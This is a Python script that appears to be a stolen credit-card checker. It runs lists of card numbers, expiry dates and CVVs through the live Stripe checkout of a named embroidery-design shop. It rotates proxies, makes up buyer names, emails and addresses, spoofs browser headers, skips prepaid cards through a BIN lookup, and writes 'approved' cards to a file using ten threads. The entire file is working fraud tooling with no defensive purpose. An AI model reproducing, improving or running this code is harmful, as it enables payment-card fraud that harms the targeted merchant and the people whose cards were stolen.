
# Developed by @wortexbabax

import os, re, time, random, json, uuid, urllib.parse
import requests
import threading
from queue import Queue

GATEWAY_NAME = "Advanced Embroidery Stripe"
PROXY_FILE = os.path.join(os.path.dirname(__file__), "proxy.txt")
PREPAID_KEYWORDS = ["PREPAID", "GIFT", "PREPAID MASTERCARD", "PREPAID VISA"]

STRIPE_PK = "pk_live_51RRyAdLKBtCy0WIH0gy3ddK2cth9zXB33leFM7W8Z6MoiaySLA3zSv7Sfa5McdYWug55SZzCAzJ23OzspAJD9KFb00Z9wfJyJ7"
WALLET_CONFIG_ID = "a94ebed5-9375-4a02-b763-91a4681a3140"

FIRST_NAMES = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles","Chris","Daniel","Matthew","Anthony","Mark","Donald","Steven","Paul","Andrew","Joshua","Kenneth","Kevin","Brian","George","Timothy","Mary","Patricia","Jennifer","Linda","Barbara","Elizabeth","Susan","Jessica","Sarah","Karen","Lisa","Nancy","Betty","Margaret","Sandra","Ashley","Dorothy","Kimberly","Emily","Donna","Michelle","Carol","Amanda","Melissa"]
LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson","White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker","Young","Allen","King","Wright","Scott","Torres","Nguyen","Hill","Flores","Green","Adams","Nelson","Baker","Hall","Rivera","Campbell","Mitchell","Carter","Roberts"]
US_STATES = ["Iowa","Ohio","Texas","Florida","California","New York","Illinois","Pennsylvania","Michigan","Georgia","North Carolina","Arizona","Virginia","Washington","Colorado","Indiana","Kentucky","Oregon","Nevada","Missouri"]
ZIP_CODES = ["10001","10011","20001","30001","60601","77001","19101","85001","75201","92101","33101","98101","80201","48201","38101","37201","44101","43201","28201","27601"]

INPUT_FILE = "cc.txt"
APPROVED_FILE = "approved.txt"
DECLINED_FILE = "declined.txt"
THREADS = 10

print_lock = threading.Lock()
seen = set()
total = 0
approved_count = 0
declined_count = 0


def notify_approved(gateway, cc_line):
    with print_lock:
        msg = f"[{gateway}] APPROVED: {cc_line}"
        print(msg)


def is_prepaid(cc_first6):
    try:
        url = f"https://uygunpos.com/wp-json/binapi/v1/lookup?bin={cc_first6}"
        headers = {"User-Agent": "Mozilla/5.0", "Referer": "https://uygunpos.com/bin-sorgulama/"}
        resp = requests.get(url, headers=headers, timeout=10)
        data = resp.json()
        if data.get("Status") == "SUCCESS":
            ctype = (data.get("Type") or "") + " " + (data.get("CardTier") or "")
            return any(kw in ctype.upper() for kw in PREPAID_KEYWORDS)
    except:
        pass
    return False


def load_proxies():
    proxies = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, "r") as f:
            proxies = [l.strip() for l in f if l.strip()]
    return proxies


def format_proxy(p):
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"http://{p}"


def gen_uuid():
    return str(uuid.uuid4())


def print_result(status, line):
    tag = "Approved" if "APPROVED" in status.upper() else "Declined"
    with print_lock:
        print(f"#{tag} {line} [{status}]")

def write_result(status, line):
    tag = "Approved" if "APPROVED" in status.upper() else "Declined"
    with print_lock:
        with open(APPROVED_FILE if "APPROVED" in status.upper() else DECLINED_FILE, "a") as f:
            f.write(f"#{tag} {line} [{status}]\n")


def check_cc(cc_line):
    global total, approved_count, declined_count
    parts = cc_line.strip().split("|")
    if len(parts) < 4:
        res = (cc_line, "Invalid format")
        write_result(res[1], cc_line)
        print_result(res[1], cc_line)
        return res

    card = parts[0].replace(" ", "").replace("-", "")
    month = parts[1].strip().zfill(2)
    year = parts[2].strip()
    cvv = parts[3].strip()
    line = f"{card}|{month}|{year}|{cvv}"

    if is_prepaid(card[:6]):
        res = (line, "PREPAID BLOCKED")
        write_result(res[1], line)
        print_result(res[1], line)
        return res

    if len(year) == 2:
        year = "20" + year

    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    full = f"{first} {last}"
    email = f"{first.lower()}.{last.lower()}{random.randint(10,999)}@gmail.com"
    phone = f"{random.randint(100,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
    state = random.choice(US_STATES)
    zipcode = random.choice(ZIP_CODES)

    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"
    guid = gen_uuid()
    muid = gen_uuid()
    sid = gen_uuid()
    client_session_id = gen_uuid()

    session = requests.Session()
    plist = load_proxies()
    if plist:
        p = random.choice(plist)
        session.proxies = {"http": format_proxy(p), "https": format_proxy(p)}

    base_headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "tr-TR,tr;q=0.9",
        "user-agent": ua,
        "sec-ch-ua": '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-gpc": "1",
    }

    try:
        r = session.post('https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi', headers={
            **base_headers, "content-type": "application/x-www-form-urlencoded", "origin": "https://www.advanced-embroidery-designs.com",
            "referer": "https://www.advanced-embroidery-designs.com/html/40010.html", "priority": "u=0, i",
            "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate", "sec-fetch-site": "same-origin", "sec-fetch-user": "?1",
        }, data={
            "action": "add_to_cart", "cart_id": "", "sku": "40010",
            "o1_b_1": "o1_b_1_1", "o1_b_1_1": "PES~Large",
            "o1_b_1_10": "XXX~Large", "o1_b_1_2": "ART~Large", "o1_b_1_3": "DST~Large",
            "o1_b_1_4": "EXP~Large", "o1_b_1_5": "HUS~Large", "o1_b_1_6": "JEF~Large",
            "o1_b_1_7": "JEF+~Large", "o1_b_1_8": "VIP~Large", "o1_b_1_9": "VP3~Large",
            "choice1": "PES~Large", "quantity": "1", "x": "122", "y": "2",
        }, timeout=15)
    except:
        res = (line, "Connection failed")
        write_result(res[1], line)
        print_result(res[1], line)
        return res

    time.sleep(random.uniform(0.5, 1.5))

    try:
        r = session.get('https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi?action=view_cart&pwkch=1', headers={
            **base_headers, "referer": "https://www.advanced-embroidery-designs.com/html/40010.html",
            "priority": "u=0, i", "cache-control": "max-age=0", "upgrade-insecure-requests": "1",
            "sec-fetch-dest": "document", "sec-fetch-mode": "navigate", "sec-fetch-site": "same-origin", "sec-fetch-user": "?1",
        }, timeout=15)
        cart_id = session.cookies.get("storecustomer", "")
        if not cart_id:
            res = (line, "Cart ID not found")
            write_result(res[1], line)
            print_result(res[1], line)
            return res
    except:
        res = (line, "Connection failed")
        write_result(res[1], line)
        print_result(res[1], line)
        return res

    time.sleep(random.uniform(0.5, 1.5))

    try:
        r = session.post('https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi', headers={
            **base_headers, "content-type": "application/x-www-form-urlencoded", "origin": "https://www.advanced-embroidery-designs.com",
            "referer": "https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi?action=view_cart&pwkch=1",
            "priority": "u=0, i", "cache-control": "max-age=0", "upgrade-insecure-requests": "1",
            "sec-fetch-dest": "document", "sec-fetch-mode": "navigate", "sec-fetch-site": "same-origin", "sec-fetch-user": "?1",
        }, data={
            "shipping_company": last, "shipping_name": first, "shipping_lastname": last,
            "email": email, "daytime_phone": phone, "home_phone": phone,
            "shipping_state": state, "payment_method": "Credit Card via Stripe",
            "action": "check_shipping_country", "cart_id": cart_id, "shipping_method": "",
        }, timeout=15)
    except:
        res = (line, "Connection failed")
        write_result(res[1], line)
        print_result(res[1], line)
        return res

    time.sleep(random.uniform(0.5, 1.5))

    try:
        r = session.post('https://www.advanced-embroidery-designs.com/cgi-bin/cart/create_intent.cgi',
            json={"cart_id": cart_id, "shipping_method": "", "shipping_state": state},
            headers={
                "accept": "*/*", "accept-language": "tr-TR,tr;q=0.9", "content-type": "application/json",
                "origin": "https://www.advanced-embroidery-designs.com",
                "referer": "https://www.advanced-embroidery-designs.com/cgi-bin/cart/store.cgi",
                "priority": "u=1, i", "user-agent": ua,
                "sec-ch-ua": '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "sec-gpc": "1",
            }, timeout=15)
        intent_data = r.json()
        client_secret = intent_data.get("clientSecret") or intent_data.get("client_secret", "")
        if not client_secret:
            res = (line, "No client secret")
            write_result(res[1], line)
            print_result(res[1], line)
            return res
        pi_id = client_secret.split("_secret_")[0]
    except Exception as e:
        res = (line, "Create intent failed")
        write_result(res[1], line)
        print_result(res[1], line)
        return res

    time.sleep(random.uniform(0.5, 1.5))

    time_on_page = str(random.randint(10000, 60000))
    confirm_data = {
        "payment_method_data[type]": "card",
        "payment_method_data[billing_details][name]": full,
        "payment_method_data[billing_details][email]": email,
        "payment_method_data[billing_details][address][postal_code]": zipcode,
        "payment_method_data[card][number]": card,
        "payment_method_data[card][cvc]": cvv,
        "payment_method_data[card][exp_month]": month,
        "payment_method_data[card][exp_year]": year[2:] if len(year) == 4 else year,
        "payment_method_data[guid]": guid,
        "payment_method_data[muid]": muid,
        "payment_method_data[sid]": sid,
        "payment_method_data[pasted_fields]": "number",
        "payment_method_data[payment_user_agent]": "stripe.js/39914d4bef; stripe-js-v3/39914d4bef; card-element",
        "payment_method_data[referrer]": "https://www.advanced-embroidery-designs.com",
        "payment_method_data[time_on_page]": time_on_page,
        "payment_method_data[client_attribution_metadata][client_session_id]": client_session_id,
        "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
        "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "card-element",
        "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2017",
        "payment_method_data[client_attribution_metadata][wallet_config_id]": WALLET_CONFIG_ID,
        "expected_payment_method_type": "card",
        "use_stripe_sdk": "true",
        "key": STRIPE_PK,
        "client_attribution_metadata[client_session_id]": client_session_id,
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "card-element",
        "client_attribution_metadata[merchant_integration_version]": "2017",
        "client_attribution_metadata[wallet_config_id]": WALLET_CONFIG_ID,
        "client_secret": client_secret,
    }

    stripe_headers = {
        "accept": "application/json",
        "accept-language": "tr-TR,tr;q=0.9",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "priority": "u=1, i",
        "user-agent": ua,
        "sec-ch-ua": '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "sec-gpc": "1",
    }

    try:
        r = session.post(f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
            data=confirm_data, headers=stripe_headers, timeout=30)
    except:
        res = (line, "Connection failed")
        write_result(res[1], line)
        print_result(res[1], line)
        return res

    try:
        resp = r.json()
    except:
        res = (line, "Unknown Error")
        write_result(res[1], line)
        print_result(res[1], line)
        return res

    if resp.get("error"):
        err_msg = resp.get("error", {}).get("message", resp.get("error", {}).get("code", "Declined"))
        res = (line, str(err_msg)[:200])
    else:
        status = resp.get("status", "")
        pi_status = resp.get("payment_intent", resp).get("status", "")

        if status == "succeeded" or pi_status == "succeeded":
            notify_approved("STRIPE", line)
            res = (line, "APPROVED")
        elif status == "requires_action" or pi_status == "requires_action":
            res = (line, "3DS Required")
        elif status == "processing" or pi_status == "processing":
            res = (line, "Processing")
        elif status == "requires_payment_method":
            res = (line, "Declined")
        elif resp.get("next_action"):
            res = (line, "3DS Required")
        else:
            res = (line, f"Status: {status or pi_status or 'Unknown'}")

    write_result(res[1], line)
    print_result(res[1], line)
    return res


def worker(q):
    while True:
        item = q.get()
        if item is None:
            break
        try:
            check_cc(item)
        except Exception as e:
            with print_lock:
                print(f"[ERROR] {item}: {e}")
        q.task_done()


def main():
    global total

    if not os.path.exists(INPUT_FILE):
        print(f"[!] {INPUT_FILE} not found! Create it with format: card|month|year|cvv")
        return

    # Clear previous results
    open(APPROVED_FILE, "w").close()
    open(DECLINED_FILE, "w").close()

    with open(INPUT_FILE, "r") as f:
        lines = [l.strip() for l in f if l.strip()]

    total = len(lines)
    print(f"[+] Loaded {total} CCs from {INPUT_FILE}")
    print(f"[=] Developed by @wortexbabax\n")

    q = Queue()
    for _ in range(THREADS):
        t = threading.Thread(target=worker, args=(q,))
        t.daemon = True
        t.start()

    for line in lines:
        q.put(line)

    q.join()


if __name__ == "__main__":
    main()
